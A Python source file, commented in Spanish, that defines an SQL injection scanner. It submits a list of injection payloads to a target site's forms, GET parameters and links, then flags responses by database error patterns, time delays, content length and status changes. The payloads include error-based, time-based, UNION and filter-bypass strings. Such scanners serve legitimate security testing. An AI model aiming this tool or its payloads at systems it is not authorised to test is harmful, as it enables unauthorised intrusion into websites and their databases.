import requests
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
from bs4 import BeautifulSoup
from datetime import datetime
import time
import re

class SQLInjectionScanner:
    def __init__(self):
        # Payloads SQL Injection comunes
        self.sql_payloads = [
            # Payloads básicos
            "'",
            "\"",
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' OR 1=1--",
            "\" OR 1=1--",
            "' OR 1=1#",
            "\" OR 1=1#",
            
            # Payloads de error
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION(), 0x7e))--",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            
            # Payloads de tiempo
            "' AND SLEEP(5)--",
            "'; WAITFOR DELAY '0:0:5'--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            
            # Payloads de unión
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT 1,2,3--",
            
            # Payloads de bypass
            "' /**/OR/**/1=1--",
            "' %20OR%201=1--",
            "'+OR+1=1--",
            "' OR 'a'='a",
            "\" OR \"a\"=\"a",
            
            # Payloads específicos por DBMS
            "'; SELECT version()--",  # PostgreSQL
            "'; SELECT @@version--",  # MySQL/SQL Server
            "' AND 1=CONVERT(int,@@version)--",  # SQL Server
            "' AND 1=1 AND SUBSTRING(@@version,1,1)='5'--",  # MySQL version check
        ]
        
        # Patrones de error SQL comunes
        self.error_patterns = [
            # MySQL
            r"mysql_fetch_array\(\)",
            r"mysql_fetch_assoc\(\)",
            r"mysql_fetch_row\(\)",
            r"mysql_num_rows\(\)",
            r"You have an error in your SQL syntax",
            r"supplied argument is not a valid MySQL result",
            r"mysql_query\(\)",
            
            # PostgreSQL
            r"pg_query\(\)",
            r"pg_exec\(\)",
            r"PostgreSQL query failed",
            r"supplied argument is not a valid PostgreSQL result",
            r"Warning: pg_",
            
            # SQL Server
            r"Microsoft OLE DB Provider for ODBC Drivers",
            r"Microsoft OLE DB Provider for SQL Server",
            r"Unclosed quotation mark after the character string",
            r"Microsoft JET Database Engine",
            r"ADODB.Field error",
            
            # Oracle
            r"ORA-[0-9]{5}",
            r"Oracle ODBC",
            r"Oracle Driver",
            r"Oracle Error",
            
            # SQLite
            r"SQLite/JDBCDriver",
            r"SQLite.Exception",
            r"sqlite3.OperationalError",
            
            # Genéricos
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"valid MySQL result",
            r"MySqlClient\.",
            r"syntax error.*at or near",
            r"quoted string not properly terminated"
        ]
    
    def scan_sql_injection(self, target_url, deep_scan=False):
        """
        Escanea vulnerabilidades SQL Injection en el sitio objetivo
        """
        results = {
            'target': target_url,
            'scan_time': datetime.now().isoformat(),
            'vulnerabilities': [],
            'forms_tested': [],
            'urls_tested': [],
            'parameters_tested': [],
            'errors': []
        }
        
        if not target_url.startswith(('http://', 'https://')):
            target_url = 'http://' + target_url
        
        try:
            # Obtener la página principal
            response = requests.get(
                target_url,
                timeout=15,
                headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
            )
            
            if response.status_code == 200:
                # Buscar formularios para testing
                self._scan_forms_sqli(target_url, response.text, results)
                
                # Buscar parámetros GET para testing
                self._scan_get_parameters_sqli(target_url, results)
                
                # Si es escaneo profundo, buscar más URLs
                if deep_scan:
                    self._deep_scan_links_sqli(target_url, response.text, results)
            
        except requests.exceptions.RequestException as e:
            results['errors'].append(f"Error accediendo al sitio: {str(e)}")
        except Exception as e:
            results['errors'].append(f"Error inesperado: {str(e)}")
        
        return results
    
    def _scan_forms_sqli(self, base_url, html_content, results):
        """
        Escanea formularios en busca de vulnerabilidades SQL Injection
        """
        try:
            soup = BeautifulSoup(html_content, 'html.parser')
            forms = soup.find_all('form')
            
            for form in forms:
                form_info = self._analyze_form_sqli(form, base_url)
                results['forms_tested'].append(form_info)
                
                # Probar SQL injection en cada campo del formulario
                for payload in self.sql_payloads[:8]:  # Usar algunos payloads para no sobrecargar
                    vulnerability = self._test_form_sqli(form_info, payload, base_url)
                    if vulnerability:
                        results['vulnerabilities'].append(vulnerability)
                        
        except Exception as e:
            results['errors'].append(f"Error escaneando formularios: {str(e)}")
    
    def _analyze_form_sqli(self, form, base_url):
        """
        Analiza un formulario para SQL injection testing
        """
        form_info = {
            'action': form.get('action', ''),
            'method': form.get('method', 'get').lower(),
            'fields': [],
            'full_action_url': ''
        }
        
        # Construir URL completa de acción
        if form_info['action']:
            form_info['full_action_url'] = urljoin(base_url, form_info['action'])
        else:
            form_info['full_action_url'] = base_url
        
        # Extraer campos del formulario
        inputs = form.find_all(['input', 'textarea', 'select'])
        for input_field in inputs:
            field_info = {
                'name': input_field.get('name', ''),
                'type': input_field.get('type', 'text'),
                'value': input_field.get('value', ''),
                'required': input_field.has_attr('required')
            }
            if field_info['name']:
                form_info['fields'].append(field_info)
        
        return form_info
    
    def _test_form_sqli(self, form_info, payload, base_url):
        """
        Prueba un payload SQL injection en un formulario
        """
        try:
            # Preparar datos del formulario
            form_data = {}
            vulnerable_field = None
            
            for field in form_info['fields']:
                if field['type'] not in ['submit', 'button', 'hidden']:
                    form_data[field['name']] = payload
                    if not vulnerable_field:
                        vulnerable_field = field['name']
                elif field['type'] == 'hidden':
                    form_data[field['name']] = field['value']
            
            # Obtener respuesta normal primero
            normal_data = {}
            for field in form_info['fields']:
                if field['type'] not in ['submit', 'button', 'hidden']:
                    normal_data[field['name']] = 'test'
                elif field['type'] == 'hidden':
                    normal_data[field['name']] = field['value']
            
            # Enviar petición normal
            normal_response = None
            try:
                if form_info['method'] == 'post':
                    normal_response = requests.post(
                        form_info['full_action_url'],
                        data=normal_data,
                        timeout=10,
                        headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
                    )
                else:
                    normal_response = requests.get(
                        form_info['full_action_url'],
                        params=normal_data,
                        timeout=10,
                        headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
                    )
            except:
                pass
            
            # Enviar petición con payload
            start_time = time.time()
            if form_info['method'] == 'post':
                response = requests.post(
                    form_info['full_action_url'],
                    data=form_data,
                    timeout=15,
                    headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
                )
            else:
                response = requests.get(
                    form_info['full_action_url'],
                    params=form_data,
                    timeout=15,
                    headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
                )
            
            response_time = time.time() - start_time
            
            # Verificar diferentes tipos de SQL injection
            vulnerability = self._analyze_sqli_response(
                response, normal_response, payload, response_time,
                form_info['full_action_url'], vulnerable_field, 'Form submission'
            )
            
            return vulnerability
                
        except requests.exceptions.RequestException as e:
            return None
        except Exception as e:
            return None
    
    def _scan_get_parameters_sqli(self, target_url, results):
        """
        Escanea parámetros GET en busca de vulnerabilidades SQL injection
        """
        try:
            parsed_url = urlparse(target_url)
            if parsed_url.query:
                params = parse_qs(parsed_url.query)
                
                for param_name, param_values in params.items():
                    results['parameters_tested'].append({
                        'parameter': param_name,
                        'original_value': param_values[0] if param_values else ''
                    })
                    
                    # Probar SQL injection en cada parámetro
                    for payload in self.sql_payloads[:5]:  # Usar pocos payloads para GET
                        vulnerability = self._test_get_parameter_sqli(target_url, param_name, payload)
                        if vulnerability:
                            results['vulnerabilities'].append(vulnerability)
                            
        except Exception as e:
            results['errors'].append(f"Error escaneando parámetros GET: {str(e)}")
    
    def _test_get_parameter_sqli(self, target_url, param_name, payload):
        """
        Prueba un payload SQL injection en un parámetro GET específico
        """
        try:
            parsed_url = urlparse(target_url)
            params = parse_qs(parsed_url.query)
            original_value = params[param_name][0] if params[param_name] else ''
            
            # Obtener respuesta normal
            normal_response = None
            try:
                normal_response = requests.get(target_url, timeout=10)
            except:
                pass
            
            # Reemplazar el valor del parámetro con el payload
            params[param_name] = [payload]
            
            # Reconstruir la URL
            new_query = urlencode(params, doseq=True)
            test_url = urlunparse((
                parsed_url.scheme,
                parsed_url.netloc,
                parsed_url.path,
                parsed_url.params,
                new_query,
                parsed_url.fragment
            ))
            
            # Realizar petición
            start_time = time.time()
            response = requests.get(
                test_url,
                timeout=15,
                headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
            )
            response_time = time.time() - start_time
            
            # Analizar respuesta
            vulnerability = self._analyze_sqli_response(
                response, normal_response, payload, response_time,
                test_url, param_name, 'GET parameter'
            )
            
            return vulnerability
                
        except requests.exceptions.RequestException:
            return None
        except Exception:
            return None
    
    def _deep_scan_links_sqli(self, base_url, html_content, results):
        """
        Escaneo profundo de enlaces para SQL injection
        """
        try:
            soup = BeautifulSoup(html_content, 'html.parser')
            links = soup.find_all('a', href=True)
            
            tested_urls = set()
            for link in links[:5]:  # Limitar para no sobrecargar
                href = link['href']
                full_url = urljoin(base_url, href)
                
                # Evitar URLs externas y duplicadas
                if urlparse(full_url).netloc == urlparse(base_url).netloc and full_url not in tested_urls:
                    tested_urls.add(full_url)
                    results['urls_tested'].append(full_url)
                    
                    # Probar SQL injection agregando parámetros
                    for payload in self.sql_payloads[:3]:  # Solo algunos payloads
                        test_url = f"{full_url}{'&' if '?' in full_url else '?'}id={payload}"
                        vulnerability = self._test_url_sqli(test_url, payload, 'id')
                        if vulnerability:
                            results['vulnerabilities'].append(vulnerability)
                            
        except Exception as e:
            results['errors'].append(f"Error en escaneo profundo: {str(e)}")
    
    def _test_url_sqli(self, test_url, payload, param_name):
        """
        Prueba SQL injection en una URL específica
        """
        try:
            # Obtener respuesta normal
            base_url = test_url.split('?')[0]
            normal_response = None
            try:
                normal_response = requests.get(base_url, timeout=10)
            except:
                pass
            
            start_time = time.time()
            response = requests.get(
                test_url,
                timeout=15,
                headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
            )
            response_time = time.time() - start_time
            
            vulnerability = self._analyze_sqli_response(
                response, normal_response, payload, response_time,
                test_url, param_name, 'URL parameter injection'
            )
            
            return vulnerability
                
        except requests.exceptions.RequestException:
            return None
        except Exception:
            return None
    
    def _analyze_sqli_response(self, response, normal_response, payload, response_time, url, parameter, method):
        for pattern in self.error_patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                return {
                    'type': 'Error-based SQL Injection',
                    'method': method,
                    'url': url,
                    'payload': payload,
                    'parameter': parameter,
                    'evidence': self._extract_error_evidence(response.text, pattern),
                    'severity': 'High',
                    'detection_method': 'Error pattern matching'
                }

        if 'SLEEP' in payload.upper() or 'WAITFOR' in payload.upper():
            if response_time > 4:
                return {
                    'type': 'Time-based SQL Injection',
                    'method': method,
                    'url': url,
                    'payload': payload,
                    'parameter': parameter,
                    'evidence': f'Response time: {response_time:.2f} seconds',
                    'severity': 'High',
                    'detection_method': 'Time delay analysis'
                }

        if normal_response and normal_response.status_code == 200:
            if len(response.text) != len(normal_response.text):
                content_diff = abs(len(response.text) - len(normal_response.text))
                if content_diff > 100:
                    return {
                        'type': 'Boolean-based SQL Injection',
                        'method': method,
                        'url': url,
                        'payload': payload,  # ✅ ESTE CAMPO
                        'parameter': parameter,
                        'evidence': f'Content length difference: {content_diff} characters',
                        'severity': 'Medium',
                        'detection_method': 'Content comparison'
                    }

        if normal_response and response.status_code != normal_response.status_code:
            return {
                'type': 'SQL Injection (Status Code Change)',
                'method': method,
                'url': url,
                'payload': payload,  # ✅ TAMBIÉN AQUÍ
                'parameter': parameter,
                'evidence': f'Status code changed from {normal_response.status_code} to {response.status_code}',
                'severity': 'Medium',
                'detection_method': 'HTTP status analysis'
            }
        print(f"[DEBUG] payload recibido: {payload}")

        return None


    
    def _extract_error_evidence(self, response_text, pattern):
        match = re.search(pattern, response_text, re.IGNORECASE)
        if match:
            # Obtener contexto alrededor del error
            start = max(0, match.start() - 100)
            end = min(len(response_text), match.end() + 100)
            context = response_text[start:end]
            return context.replace('\\n', ' ').strip()[:300]  # Limitar a 300 caracteres
        return "SQL error detected in response"
    
    def get_vulnerability_summary(self, results):
        """
        Genera un resumen de las vulnerabilidades SQL injection encontradas
        """
        summary = {
            'total_vulnerabilities': len(results['vulnerabilities']),
            'high_severity': 0,
            'medium_severity': 0,
            'low_severity': 0,
            'vulnerability_types': {},
            'affected_parameters': [],
            'detection_methods': {}
        }
        
        for vuln in results['vulnerabilities']:
            # Contar por severidad
            severity = vuln.get('severity', 'Medium')
            if severity == 'High':
                summary['high_severity'] += 1
            elif severity == 'Medium':
                summary['medium_severity'] += 1
            else:
                summary['low_severity'] += 1
            
            # Contar por tipo
            vuln_type = vuln.get('type', 'Unknown')
            summary['vulnerability_types'][vuln_type] = summary['vulnerability_types'].get(vuln_type, 0) + 1
            
            # Parámetros afectados
            param = vuln.get('parameter', '')
            if param and param not in summary['affected_parameters']:
                summary['affected_parameters'].append(param)
            
            # Métodos de detección
            detection_method = vuln.get('detection_method', 'Unknown')
            summary['detection_methods'][detection_method] = summary['detection_methods'].get(detection_method, 0) + 1
        
        return summary

    def to_frontend_format(self, results):
        return {"vulnerabilities": results.get("vulnerabilities", [])
        }

